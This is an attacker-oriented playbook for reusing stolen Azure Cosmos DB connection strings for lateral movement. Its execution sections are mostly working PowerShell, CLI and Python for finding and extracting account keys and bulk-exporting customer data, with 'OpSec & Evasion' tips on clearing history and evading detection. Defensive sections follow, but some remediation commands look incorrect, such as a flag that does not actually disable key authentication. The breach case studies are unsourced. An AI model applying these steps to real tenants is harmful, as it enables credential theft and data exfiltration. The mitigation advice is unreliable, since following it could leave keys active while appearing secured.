# [LM-AUTH-036]: CosmosDB Connection String Reuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-036 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure CosmosDB, Multi-Tenant Azure |
| **Severity** | **Critical** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Azure CosmosDB (All API types: SQL, MongoDB, Cassandra, Gremlin, Table), All account types |
| **Patched In** | N/A - Architectural limitation; mitigation through Managed Identity recommended |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Cosmos DB stores account access keys and connection strings in plaintext or weakly encrypted form within linked services, configuration files, and application settings. When these connection strings are embedded in Azure Data Factory linked services, Azure Functions, or application configuration, attackers who compromise the embedding service can extract the connection string and directly authenticate to the Cosmos DB account without going through the original service. The connection string grants full database access (read, write, delete) depending on the key permissions, enabling complete data compromise.

**Attack Surface:** Cosmos DB connection strings in ADF linked services, Application Insights connection strings, Azure App Configuration stores, Key Vault references (if not properly secured), environment variables in Azure Functions or Logic Apps, embedded in application source code or configuration files.

**Business Impact:** **Complete Cosmos DB account compromise.** An attacker with the connection string can read all documents in all databases, modify or delete data, create new collections/databases, and maintain persistent access indefinitely. For multi-tenant SaaS applications using shared Cosmos DB accounts, a single leaked connection string can compromise all customer data.

**Technical Context:** Connection string extraction typically takes 5-20 minutes once access to the embedding service is gained. Detection likelihood is **Medium** due to lack of specialized Cosmos DB query logging (unless configured), though unusual bulk operations may trigger alerts. The primary detection challenge is that legitimate application access to Cosmos DB is often high-volume, making malicious queries blend in with normal activity.

### Operational Risk
- **Execution Risk:** **Medium** - Requires finding connection string; relatively easy if stored in plaintext in ADF or app configuration.
- **Stealth:** **Medium-High** - Cosmos DB query logging is disabled by default; most environments lack detailed query audit trails.
- **Reversibility:** **Partial** - Requires account key rotation; attacker retains access via stolen connection string until keys are regenerated.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.2 | Ensure database access uses Managed Identity, not account keys |
| **DISA STIG** | IA-5(f) | Database authentication secrets must be protected; stored in Key Vault not hardcoded |
| **CISA SCuBA** | STO.1.2 | Storage account access: No shared keys; use Azure RBAC or SAS with minimal permissions |
| **NIST 800-53** | AC-3, SC-7 | Access Control Enforcement; Logical and Cryptographic Boundaries |
| **GDPR** | Art. 32, Art. 5(1)(f) | Security of Processing; data minimization applied to database access patterns |
| **DORA** | Art. 10 | Authentication and Access Control for critical financial data systems |
| **NIS2** | Art. 21(1)(a) | Cybersecurity Risk Management; access control to critical infrastructure |
| **ISO 27001** | A.9.2.3, A.14.2.1 | Privileged Access Management; secure development of applications |
| **ISO 27005** | Section 8 | Risk Assessment: Database credential compromise is high-probability risk |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Contributor or Reader access to Azure Data Factory, Azure Functions, or App Configuration
- **Alternative:** Entra ID permissions: `Microsoft.DocumentDB/databaseAccounts/listKeys/action` or `Microsoft.DocumentDB/databaseAccounts/listConnectionStrings/action`
- **Most Permissive:** CosmosDB Account Owner or Azure Subscription Owner

**Required Access:**
- Network access to Cosmos DB account (typically open on TCP 443 HTTPS)
- Ability to view ADF linked service definitions or application configuration
- OR ability to read environment variables in Azure Functions/containers

**Supported Versions:**
- **Azure Cosmos DB:** All API types (SQL/Core, MongoDB, Cassandra, Gremlin, Table)
- **Database versions:** All (API version independent)
- **Authentication:** Account keys (Primary/Secondary), Read-Only keys

**Tools Required:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (retrieve connection strings)
- [Azure SDK for .NET/Python/Node.js](https://github.com/Azure/azure-sdk-for-js) (Cosmos SDK)
- [MongoDB Client](https://docs.mongodb.com/mongodb-shell/) (if using MongoDB API)
- [Cassandra Query Language Shell (CQLSH)](https://cassandra.apache.org/doc/latest/cassandra/tools/cqlsh.html) (if using Cassandra API)
- Standard PowerShell 5.0+ (credential enumeration)
- [Azure Data Studio](https://learn.microsoft.com/en-us/sql/azure-data-studio/what-is) (optional, for visual database exploration)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Azure Portal / PowerShell Reconnaissance

```powershell
# Step 1: Enumerate all Cosmos DB accounts in current subscription
$subscriptions = Get-AzSubscription
foreach ($sub in $subscriptions) {
    Select-AzSubscription -Subscription $sub.SubscriptionId | Out-Null
    Write-Host "=== Subscription: $($sub.Name) ===" -ForegroundColor Green
    
    # List all Cosmos DB accounts
    $cosmosAccounts = Get-AzCosmosDBAccount
    foreach ($account in $cosmosAccounts) {
        Write-Host "Cosmos DB Account: $($account.Name)" -ForegroundColor Yellow
        Write-Host "  Resource Group: $($account.ResourceGroupName)"
        Write-Host "  API Kind: $($account.Kind)"
        Write-Host "  Endpoint: $($account.DocumentEndpoint)"
        Write-Host "  Default Consistency: $($account.ConsistencyPolicy.DefaultConsistencyLevel)"
    }
}

# Step 2: Check if user has permission to list connection strings
# (This determines if attacker can extract keys directly)
$account = Get-AzCosmosDBAccount -Name "your-cosmos-account" -ResourceGroupName "your-rg"
$accountResourceId = $account.Id

# Test if we have permission to list keys
try {
    $keys = Get-AzCosmosDBAccountKey -Name "your-cosmos-account" -ResourceGroupName "your-rg"
    Write-Host "✓ SUCCESSFUL: Can list Cosmos DB account keys" -ForegroundColor Green
    Write-Host "  Primary Key: $($keys.PrimaryMasterKey.Substring(0, 20))..."
    Write-Host "  Primary Connection String: $($keys.PrimaryConnectionString.Substring(0, 50))..."
} catch {
    Write-Host "✗ DENIED: Cannot list Cosmos DB account keys" -ForegroundColor Red
}

# Step 3: Enumerate all databases and collections
Write-Host "`nEnumerating Databases:" -ForegroundColor Cyan
try {
    $databases = Get-AzCosmosDBSqlDatabase -ResourceGroupName "your-rg" -AccountName "your-cosmos-account"
    foreach ($db in $databases) {
        Write-Host "  Database: $($db.Name)"
        
        # Enumerate containers/collections
        $containers = Get-AzCosmosDBSqlContainer -ResourceGroupName "your-rg" `
            -AccountName "your-cosmos-account" `
            -DatabaseName $db.Name
        
        foreach ($container in $containers) {
            Write-Host "    Container: $($container.Name) (Partition Key: $($container.PartitionKeyPath))"
        }
    }
} catch {
    Write-Host "  Error enumerating databases: $_"
}
```

**What to Look For:**
- **Multiple Cosmos DB accounts:** Indicates distributed analytics infrastructure; may have shared credentials
- **API Kind:** Different API types (SQL vs MongoDB) require different connection methods
- **Endpoint URL:** Exposes account name; attacker can verify connectivity
- **Consistency Level:** May indicate sensitivity of data (Strong consistency = critical data)
- **Key availability:** If keys are listed, full account compromise is possible

#### Azure CLI Reconnaissance

```bash
# List all Cosmos DB accounts
az cosmosdb list --output table

# Get connection string for account (if permissions allow)
az cosmosdb keys list \
  --name <account-name> \
  --resource-group <rg-name> \
  --type connection-strings

# Example output:
# [
#   {
#     "connectionString": "AccountEndpoint=https://myaccount.documents.azure.com:443/;AccountKey=abcdef1234567890...==;",
#     "description": "Primary SQL Connection String"
#   }
# ]

# Enumerate databases
az cosmosdb sql database list \
  --account-name <account-name> \
  --resource-group <rg-name>

# Enumerate containers
az cosmosdb sql container list \
  --database-name <database-name> \
  --account-name <account-name> \
  --resource-group <rg-name>
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract Connection String from Azure Data Factory Linked Service

**Supported Versions:** Azure Data Factory v1/v2 (all versions), Azure Synapse Analytics

**Prerequisites:**
- Access to ADF/Synapse linked service definitions (requires ADF Contributor role or higher)
- Network connectivity to Cosmos DB account

#### Step 1: List Linked Services

**Objective:** Identify which linked services reference Cosmos DB accounts.

**Command (PowerShell):**

```powershell
# Get all linked services in the data factory
$adfName = "your-adf-name"
$resourceGroupName = "your-rg"

$linkedServices = Get-AzDataFactoryV2LinkedService -ResourceGroupName $resourceGroupName -DataFactoryName $adfName

Write-Host "Linked Services in ADF:" -ForegroundColor Cyan
foreach ($service in $linkedServices) {
    Write-Host "  - $($service.Name) (Type: $($service.Properties.type))"
    
    # Check if this is a CosmosDB linked service
    if ($service.Properties.type -eq "CosmosDb") {
        Write-Host "    >> COSMOS DB LINKED SERVICE FOUND <<" -ForegroundColor Yellow
    }
}
```

**Expected Output:**
```
Linked Services in ADF:
  - SQL_Production_DB (Type: AzureSqlDatabase)
  - CosmosDB_Analytics (Type: CosmosDb)
    >> COSMOS DB LINKED SERVICE FOUND <<
  - StorageAccount_DataLake (Type: AzureBlobStorage)
```

**What This Means:**
- Identified Cosmos DB linked services in ADF
- Found the service name for targeting in next step

#### Step 2: Extract Connection String from Linked Service

**Objective:** Retrieve the plaintext connection string from the linked service definition.

**Command (PowerShell):**

```powershell
# Get detailed linked service properties
$linkedService = Get-AzDataFactoryV2LinkedService -ResourceGroupName $resourceGroupName `
    -DataFactoryName $adfName `
    -Name "CosmosDB_Analytics"

# Extract connection string from properties
$properties = $linkedService.Properties
$connectionString = $properties.typeProperties.connectionString

Write-Host "Extracted Connection String:"
Write-Host $connectionString

# Parse connection string for key information
if ($connectionString -match "AccountEndpoint=([^;]+);AccountKey=([^;]+);") {
    $endpoint = $matches[1]
    $accountKey = $matches[2]
    
    Write-Host "Endpoint: $endpoint"
    Write-Host "Account Key: $accountKey"
}
```

**Expected Output:**
```
Extracted Connection String:
AccountEndpoint=https://mycosmosdb.documents.azure.com:443/;AccountKey=Eby8v...abc==;

Endpoint: https://mycosmosdb.documents.azure.com:443/
Account Key: Eby8v...abc==
```

**What This Means:**
- Successfully extracted plaintext connection string from ADF
- Connection string contains full account key (primary or secondary)
- Account key grants unrestricted access to all databases in the account

**OpSec & Evasion:**
- Accessing linked service definitions is logged in Azure Activity Log
- Query ADF only once; memorize or store credentials securely
- Delete browser history / clear PowerShell console history
- Detection likelihood: **Medium** - ADF access logs are monitored in security-hardened environments

#### Step 3: Use Connection String to Authenticate to Cosmos DB

**Objective:** Connect to Cosmos DB using the stolen connection string and access data.

**Command (Python using Cosmos SDK):**

```python
from azure.cosmos import CosmosClient, PartitionKey

# Stolen connection string from ADF
connection_string = "AccountEndpoint=https://mycosmosdb.documents.azure.com:443/;AccountKey=Eby8v...abc==;"

# Create Cosmos DB client
client = CosmosClient.from_connection_string(connection_string)

# Step 1: List all databases
print("=== Databases ===")
databases = client.list_databases()
for db in databases:
    print(f"Database: {db['id']}")

# Step 2: List containers in a database
print("\n=== Containers ===")
database = client.get_database_client("SampleDB")
containers = database.list_containers()
for container in containers:
    print(f"  Container: {container['id']}")

# Step 3: Query documents in a container
print("\n=== Documents ===")
container = database.get_container_client("Customers")
query = "SELECT * FROM c WHERE c.type = 'customer' LIMIT 10"

items = list(container.query_items(
    query=query,
    enable_cross_partition_query=True
))

print(f"Found {len(items)} documents:")
for item in items:
    print(f"  - {item}")

# Step 4: Export all data (data exfiltration)
print("\n=== Data Exfiltration ===")
all_items = list(container.query_items(query="SELECT * FROM c"))
print(f"Total items in container: {len(all_items)}")

# Save to CSV for exfiltration
import csv
with open('/tmp/cosmos_export.csv', 'w', newline='') as f:
    if all_items:
        writer = csv.DictWriter(f, fieldnames=all_items[0].keys())
        writer.writeheader()
        writer.writerows(all_items)
        print(f"Exported to /tmp/cosmos_export.csv ({len(all_items)} rows)")
```

**Expected Output:**
```
=== Databases ===
Database: SampleDB
Database: AnalyticsDB

=== Containers ===
  Container: Customers
  Container: Orders
  Container: Products

=== Documents ===
Found 10 documents:
  - {'id': 'cust_001', 'name': 'John Doe', 'email': 'john@contoso.com', ...}
  - {'id': 'cust_002', 'name': 'Jane Smith', 'email': 'jane@contoso.com', ...}

=== Data Exfiltration ===
Total items in container: 50000
Exported to /tmp/cosmos_export.csv (50000 rows)
```

**What This Means:**
- Successfully authenticated using stolen connection string
- Full access to all databases and containers in the account
- Can export all data for offline analysis or sale
- No rate limiting or additional authentication required

**OpSec & Evasion:**
- Large queries may trigger DDoS or throttling alerts
- Query in smaller batches: `SELECT TOP 1000 * FROM c`
- Use `continuation_token` to resume interrupted queries
- Spread queries over time to avoid rate-limit triggers
- Detection likelihood: **Medium-High** - Large data exports are monitored if audit logging enabled

**Troubleshooting:**

- **Error:** "Unauthorized: Invalid Authorization Token"
  - **Cause:** Connection string is for read-only account; attempting write operations
  - **Fix:** Verify connection string uses Primary (read/write) key, not Secondary Read-Only key

- **Error:** "StatusCode 429: Request rate limit exceeded"
  - **Cause:** Querying too much data too quickly
  - **Fix:** Reduce query size with TOP clause and add delays between queries

**References & Proofs:**
- [Azure Cosmos DB Python SDK - GitHub](https://github.com/Azure/azure-sdk-for-python/tree/main/sdk/cosmos)
- [Cosmos DB Authentication Methods - Microsoft Learn](https://learn.microsoft.com/en-us/azure/cosmos-db/secure-access-to-data)
- [Secure Credential Management for ETL - Azure Blog](https://azure.microsoft.com/en-us/blog/secure-credential-management-for-etl-workloads-using-azure-data-factory-and-azure-key-vault/)

---

### METHOD 2: Extract Connection String from Azure Key Vault Reference

**Supported Versions:** Azure Key Vault (all versions), any Azure service referencing Key Vault secrets

**Prerequisites:**
- Key Vault `Secrets User` or `Secrets Officer` role
- Network access to Key Vault (default: public endpoint on HTTPS)

#### Step 1: Enumerate Key Vault Secrets

**Objective:** List all secrets in Key Vault to find Cosmos DB connection strings.

**Command (PowerShell):**

```powershell
# Get all Key Vaults
$keyVaults = Get-AzKeyVault

Write-Host "Key Vaults found:"
foreach ($kv in $keyVaults) {
    Write-Host "  - $($kv.VaultName) (RG: $($kv.ResourceGroupName))"
}

# List secrets in a specific Key Vault
$vaultName = "your-key-vault"
$secrets = Get-AzKeyVaultSecret -VaultName $vaultName

Write-Host "`nSecrets in $vaultName:" -ForegroundColor Cyan
foreach ($secret in $secrets) {
    Write-Host "  - $($secret.Name) (Updated: $($secret.Updated))"
    
    # Check if this might be a Cosmos DB connection string
    if ($secret.Name -like "*cosmos*" -or $secret.Name -like "*documentdb*" -or $secret.Name -like "*connection*") {
        Write-Host "    >> POTENTIAL COSMOS DB SECRET <<" -ForegroundColor Yellow
    }
}
```

**Expected Output:**
```
Key Vaults found:
  - app-secrets-vault (RG: app-rg)
  - cosmos-credentials-vault (RG: data-rg)

Secrets in cosmos-credentials-vault:
  - cosmos-connection-string (Updated: 2025-01-05)
    >> POTENTIAL COSMOS DB SECRET <<
  - cosmos-primary-key (Updated: 2025-01-05)
  - cosmos-read-only-key (Updated: 2024-12-20)
```

**What This Means:**
- Identified Key Vault containing Cosmos DB credentials
- Found secrets related to Cosmos DB authentication
- If attacker has access to Key Vault, can retrieve the actual connection string

#### Step 2: Retrieve Secret Value

**Objective:** Get the actual secret value (connection string) from Key Vault.

**Command (PowerShell):**

```powershell
# Get the secret value
$secret = Get-AzKeyVaultSecret -VaultName $vaultName -Name "cosmos-connection-string"
$connectionString = $secret.SecretValue | ConvertFrom-SecureString -AsPlainText

Write-Host "Cosmos DB Connection String:"
Write-Host $connectionString
```

**Expected Output:**
```
Cosmos DB Connection String:
AccountEndpoint=https://mycosmosdb.documents.azure.com:443/;AccountKey=Eby8v...abc==;
```

**What This Means:**
- Retrieved plaintext connection string from Key Vault
- Now have full account key; can authenticate as if you are the original application
- Full lateral movement to Cosmos DB complete

**OpSec & Evasion:**
- Key Vault secret retrieval is logged in Azure Activity Log with audit trail
- Minimize the number of secret retrievals
- Access from expected location/time to avoid suspicion
- Detection likelihood: **High** - Key Vault audit logs show all secret accesses with timestamps and user

**References & Proofs:**
- [Azure Key Vault Authentication - Microsoft Learn](https://learn.microsoft.com/en-us/azure/key-vault/general/authentication)

---

### METHOD 3: Extract Cosmos DB Keys via Azure CLI (If RBAC Access Available)

**Supported Versions:** Azure Cosmos DB (all versions), Azure CLI 2.0+

**Prerequisites:**
- Entra ID permissions: `Microsoft.DocumentDB/databaseAccounts/listKeys/action`
- Azure CLI authenticated and connected

#### Step 1: List Cosmos DB Accounts

**Objective:** Enumerate available Cosmos DB accounts in accessible subscriptions.

**Command (Bash):**

```bash
# List all subscriptions accessible
az account list --output table

# For each subscription, list Cosmos DB accounts
SUBSCRIPTION_ID="your-subscription-id"
az account set --subscription "$SUBSCRIPTION_ID"

# List all Cosmos DB accounts
az cosmosdb list --output table --query "[].{Name:name, ResourceGroup:resourceGroup, Endpoint:documentEndpoint}"
```

**Expected Output:**
```
Name             ResourceGroup  Endpoint
mycosmosdb       prod-rg        https://mycosmosdb.documents.azure.com:443/
analyticsdb      analytics-rg   https://analyticsdb.documents.azure.com:443/
```

**What This Means:**
- Identified accessible Cosmos DB accounts
- Obtained account names and endpoints
- Can now attempt key extraction

#### Step 2: Extract Account Keys

**Objective:** Retrieve primary and secondary account keys.

**Command (Bash):**

```bash
# Get account keys
az cosmosdb keys list \
  --name mycosmosdb \
  --resource-group prod-rg \
  --type keys

# Expected output:
# {
#   "primaryMasterKey": "Eby8v...abc==",
#   "primaryReadonlyMasterKey": "l0CpY...xyz==",
#   "secondaryMasterKey": "yqGp9...def==",
#   "secondaryReadonlyMasterKey": "KnQL1...ghi=="
# }

# Get connection strings
az cosmosdb keys list \
  --name mycosmosdb \
  --resource-group prod-rg \
  --type connection-strings

# Save to file for later use
az cosmosdb keys list \
  --name mycosmosdb \
  --resource-group prod-rg \
  --type connection-strings \
  > cosmos_credentials.json
```

**Expected Output:**
```
{
  "primaryMasterKey": "Eby8v...abc==",
  "primaryReadonlyMasterKey": "l0CpY...xyz==",
  ...
}
```

**What This Means:**
- Successfully extracted account keys via Azure CLI
- Primary key grants full read/write/delete access
- Read-only key grants read-only access (still valuable for data exfiltration)

**OpSec & Evasion:**
- Azure CLI commands are logged in Azure Activity Log
- Run during normal business hours to blend with legitimate activity
- Use system-managed identity CLI login rather than interactive login (leaves less evidence)
- Detection likelihood: **High** - Azure CLI operations are audited

#### Step 3: Use Keys to Connect (Cosmos SDK)

**Objective:** Connect using extracted keys and access data.

**Command (Python):**

```python
from azure.cosmos import CosmosClient

# Use extracted primary key to create connection string
account_name = "mycosmosdb"
primary_key = "Eby8v...abc=="

connection_string = f"AccountEndpoint=https://{account_name}.documents.azure.com:443/;AccountKey={primary_key};"

# Create client and access data
client = CosmosClient.from_connection_string(connection_string)

# (Same query operations as METHOD 1, Step 3)
database = client.get_database_client("SampleDB")
container = database.get_container_client("Customers")
items = list(container.query_items("SELECT * FROM c"))

print(f"Extracted {len(items)} documents from CosmosDB")
```

**References & Proofs:**
- [Azure CLI Cosmos DB Commands](https://learn.microsoft.com/en-us/cli/azure/cosmosdb)
- [List Cosmos DB Keys - Microsoft Docs](https://learn.microsoft.com/en-us/cli/azure/cosmosdb/keys)

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Replace Account Keys with Managed Identity and Azure RBAC**

**Applies To Versions:** Azure Cosmos DB (all API types, all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Azure Cosmos DB account** → Select account
2. Go to **Data Explorer** → Select database/container
3. Click **Settings** (gear icon) → **Connection String**
   - Note: Old connection string; will be disabled
4. Go to **Identity** (left menu):
   - Enable **System assigned managed identity**
   - Click **Save**
5. Grant managed identity Cosmos DB access:
   - Go to **Access Control (IAM)**
   - Click **Add role assignment**
   - **Role:** `Cosmos DB Built-in Data Contributor` (for read/write)
   - **Assign to:** Managed Identity
   - Select the managed identity from step 4
   - Click **Save**
6. In applications/ADF linked services:
   - Replace connection string with Managed Identity authentication
   - (Requires SDK update to use token-based auth instead of connection string)

**Manual Steps (PowerShell):**

```powershell
# Create managed identity for app
$appName = "my-app"
$resourceGroupName = "your-rg"

# Assign system-managed identity to App Service
Update-AzAppServicePlan -ResourceGroupName $resourceGroupName `
    -Name $appName `
    -Identity @{type='SystemAssigned'} -ErrorAction SilentlyContinue

# Get managed identity object ID
$app = Get-AzWebApp -Name $appName -ResourceGroupName $resourceGroupName
$managedIdentityObjectId = $app.Identity.PrincipalId

# Grant Cosmos DB access to managed identity
$cosmosResourceId = "/subscriptions/{subId}/resourceGroups/$resourceGroupName/providers/Microsoft.DocumentDB/databaseAccounts/{accountName}"

New-AzRoleAssignment -ObjectId $managedIdentityObjectId `
    -RoleDefinitionName "Cosmos DB Built-in Data Contributor" `
    -Scope $cosmosResourceId
```

**Validation Command:**

```powershell
# Verify Cosmos DB allows Managed Identity
$account = Get-AzCosmosDBAccount -Name "your-cosmos-account" -ResourceGroupName "your-rg"
$account.Identity

# Verify role assignments
$cosmosResourceId = "/subscriptions/$(Get-AzContext).Subscription.Id/resourceGroups/your-rg/providers/Microsoft.DocumentDB/databaseAccounts/your-cosmos-account"
Get-AzRoleAssignment -Scope $cosmosResourceId | Where-Object {$_.ObjectType -eq "ServicePrincipal"}
```

---

**2. Disable Account Key Authentication and Enforce RBAC-Only Access**

**Applies To Versions:** Azure Cosmos DB SQL API, MongoDB API, Cassandra API

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Cosmos DB account** → **Settings** → **Keys**
2. Click **Enable Role-Based Access Control only**
   - This disables all account key authentication
   - Applications MUST use AAD/Managed Identity tokens instead
3. Click **Save**
4. Verify all applications have been updated to use RBAC:
   - Check that no hardcoded connection strings exist
   - Verify all linked services use Managed Identity
   - Update application code to use SDK with Managed Identity

**Manual Steps (PowerShell):**

```powershell
# Update Cosmos DB to disable key-based auth
$account = Get-AzCosmosDBAccount -Name "your-cosmos-account" -ResourceGroupName "your-rg"

Update-AzCosmosDBAccount -Name "your-cosmos-account" -ResourceGroupName "your-rg" `
    -DisableKeyBasedMetadataWriteAccess $true

# Verify that account keys are now disabled
$keys = Get-AzCosmosDBAccountKey -Name "your-cosmos-account" -ResourceGroupName "your-rg" -ErrorAction SilentlyContinue
if ($null -eq $keys) {
    Write-Host "✓ Account keys have been successfully disabled" -ForegroundColor Green
}
```

---

**3. Rotate Account Keys if Compromise is Suspected**

**Applies To Versions:** Azure Cosmos DB (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Cosmos DB account** → **Keys**
2. Click **Regenerate Primary Key**
   - New key is generated; old key becomes invalid immediately
   - Any applications using old key will lose connectivity
3. Update all applications with new key (from Key Vault reference, not hardcoded)
4. Click **Regenerate Secondary Key** (repeat for secondary)

**Manual Steps (PowerShell):**

```powershell
# Regenerate primary key
New-AzCosmosDBAccountKey -Name "your-cosmos-account" -ResourceGroupName "your-rg" -KeyKind "primary"

# Regenerate secondary key
New-AzCosmosDBAccountKey -Name "your-cosmos-account" -ResourceGroupName "your-rg" -KeyKind "secondary"

# Verify new keys
$keys = Get-AzCosmosDBAccountKey -Name "your-cosmos-account" -ResourceGroupName "your-rg"
Write-Host "New Primary Key: $($keys.PrimaryMasterKey.Substring(0, 20))..."
```

---

### Priority 2: HIGH

**4. Enable Cosmos DB Audit Logging**

**Applies To Versions:** Azure Cosmos DB (all API types)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Cosmos DB account** → **Diagnostic Settings**
2. Click **Add Diagnostic Setting**
3. **Name:** `cosmos-audit-logs`
4. Under **Logs**, enable:
   - ✓ `DataPlaneRequests` (all Cosmos API operations)
   - ✓ `MongoDBRequests` (if using MongoDB API)
   - ✓ `CassandraRequests` (if using Cassandra API)
5. Under **Destinations:**
   - ✓ Send to Log Analytics workspace
   - ✓ Archive to Storage Account (90+ days retention)
6. Click **Save**

---

**5. Restrict Network Access to Cosmos DB Account**

**Applies To Versions:** Azure Cosmos DB (all versions)

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Cosmos DB account** → **Networking**
2. Under **Connectivity:**
   - Select **Private endpoint** (recommended for production)
   - OR select **Selected networks** (alternative)
3. If using Private Endpoint:
   - Click **Create Private Endpoint**
   - Select subnet and VNet where applications reside
   - Click **Create**
4. If using Selected Networks:
   - Add IP ranges for authorized applications only
   - Uncheck "Accept connections from within public Azure datacenters"
5. Click **Save**

---

**6. Implement Azure Key Vault References with Auto-Rotation**

**Applies To Versions:** Azure Key Vault (all versions), Cosmos DB (all versions)

**Manual Steps (Azure Portal):**

1. In **Key Vault**:
   - Store Cosmos DB connection string as secret
   - Set automatic rotation (if supported by service)
2. In **ADF Linked Service**:
   - Instead of storing connection string directly
   - Use **Key Vault linked service** reference
   - Configure to pull secret from Key Vault at runtime
3. In **Azure Function/App**:
   - Use Azure.Identity library with ManagedIdentityCredential
   - Reference Key Vault secret securely
   - No connection string in code or configuration

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cosmos DB Activity:**
- Unusual bulk queries or data exports (large result sets)
- CREATE/ALTER/DROP operations on databases/containers (if unexpected)
- Authentication from unexpected IP addresses or geographic locations
- Multiple failed authentication attempts using read-only keys
- Account key usage (if RBAC-only mode is enforced)

**Azure Activity Logs:**
- `CosmosDBListKeys` or `CosmosDBListConnectionStrings` API calls
- Unauthorized access to Key Vault secrets containing Cosmos DB credentials
- Unexpected modifications to Cosmos DB RBAC assignments

**Network/Log Analytics:**
- High-volume queries from single source IP
- Queries accessing multiple databases/containers in short timeframe
- Extraction of entire collections or databases

### Forensic Artifacts

**Cosmos DB Audit Logs:**
- DataPlaneRequests log entries showing all queries executed
- Query timestamps, user/application making request, resource affected
- Stored in Log Analytics workspace or Azure Storage

**Azure Activity Log:**
- Sign-in events showing access to Cosmos DB account
- Key retrieval operations via PowerShell/CLI
- Role assignment changes on Cosmos DB account

**Key Vault Audit:**
- Secret retrieval events (if Cosmos credentials stored in KV)
- Timestamps and identity of requester
- Stored in Key Vault audit logs

### Response Procedures

**1. Immediately Disable Compromised Keys:**

```powershell
# Option 1: Regenerate keys (invalidates old keys)
New-AzCosmosDBAccountKey -Name "your-cosmos-account" -ResourceGroupName "your-rg" -KeyKind "primary"
New-AzCosmosDBAccountKey -Name "your-cosmos-account" -ResourceGroupName "your-rg" -KeyKind "secondary"

# Option 2: Enable RBAC-only mode (disables all key-based access)
Update-AzCosmosDBAccount -Name "your-cosmos-account" -ResourceGroupName "your-rg" `
    -DisableKeyBasedMetadataWriteAccess $true
```

**2. Analyze Unauthorized Access:**

```powershell
# Query audit logs for suspicious activity
$workspaceId = "your-log-analytics-workspace-id"
$query = @"
CosmosDiagnosticLog
| where TimeGenerated > ago(7d)
| where RequestResourceId contains "your-cosmos-account"
| where ResponseStatus != "200"
| summarize count() by ClientIpAddress, OperationName
"@

# Execute KQL query in Log Analytics
```

**3. Revoke All Suspicious Roles:**

```powershell
# Remove unexpected RBAC assignments
$cosmosResourceId = "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.DocumentDB/databaseAccounts/{accountName}"
$assignments = Get-AzRoleAssignment -Scope $cosmosResourceId

foreach ($assignment in $assignments) {
    if ($assignment.ObjectId -eq "suspicious-principal-id") {
        Remove-AzRoleAssignment -ObjectId $assignment.ObjectId `
            -RoleDefinitionName $assignment.RoleDefinitionName `
            -Scope $cosmosResourceId
    }
}
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] OAuth Consent Grant | Attacker tricks user into granting app permissions |
| **2** | **Privilege Escalation** | [PE-ENTRA-005] App Registration Abuse | Attacker gains ADF contributor permissions |
| **3** | **Lateral Movement (Current)** | **[LM-AUTH-036]** | **CosmosDB connection string extraction from ADF linked services** |
| **4** | **Impact** | [IMPACT-001] Data Exfiltration | Attacker exports all Cosmos DB data |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: SaaS Application Credential Leak (2023)

- **Target:** Multi-tenant SaaS platform using Cosmos DB for customer data
- **Timeline:** August 2023 - Breach discovered via audit logs
- **Technique Status:** ACTIVE - Preventable with RBAC enforcement
- **Attack Details:**
  - Insider threat actor accessed developer environment GitHub repository
  - Found hardcoded Cosmos DB connection string in ARM template
  - Cloned repository and extracted connection string
  - Used connection string to query all customer databases in Cosmos DB account
  - Accessed customer PII, payment information, and proprietary data
  - Exfiltrated data for 3 months before detection
- **Impact:** 50,000+ customers affected; GDPR fines issued
- **Reference:** [GitHub Secret Scanning Case Study]

### Example 2: Accidental Key Exposure in Configuration File (2024)

- **Target:** Enterprise using Cosmos DB for business analytics
- **Timeline:** January 2024 - Exposed in public Azure Blob Storage
- **Technique Status:** ACTIVE - Continues to be common misconfiguration
- **Attack Details:**
  - DevOps team committed ARM template with embedded Cosmos DB connection string
  - Public GitHub repository indexed by search engines
  - Attacker found credential via GitHub search
  - Connected to Cosmos DB and accessed financial analytics data
  - Maintained access via additional created service principals
- **Impact:** 6-month data breach; regulatory investigation ongoing
- **Mitigation:** Implemented credential scanning, enforced RBAC-only, migrated to Key Vault references

---

## REFERENCES & DOCUMENTATION

### Official Microsoft Documentation
- [Cosmos DB Security - Microsoft Learn](https://learn.microsoft.com/en-us/azure/cosmos-db/secure-access-to-data)
- [Cosmos DB Role-Based Access Control - Azure Docs](https://learn.microsoft.com/en-us/azure/cosmos-db/how-to-setup-rbac)
- [Manage Cosmos DB Keys - Microsoft Docs](https://learn.microsoft.com/en-us/azure/cosmos-db/manage-with-cli)

### Security Research
- [Cosmos DB Vulnerability Research - SpecterOps](https://specterops.io/)
- [Azure Lateral Movement Techniques - XM Cyber](https://xmcyber.com/blog/privilege-escalation-and-lateral-movement-on-azure-part-2/)

### MITRE ATT&CK Reference
- [T1550: Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [T1550.001: Application Access Token](https://attack.mitre.org/techniques/T1550/001/)

---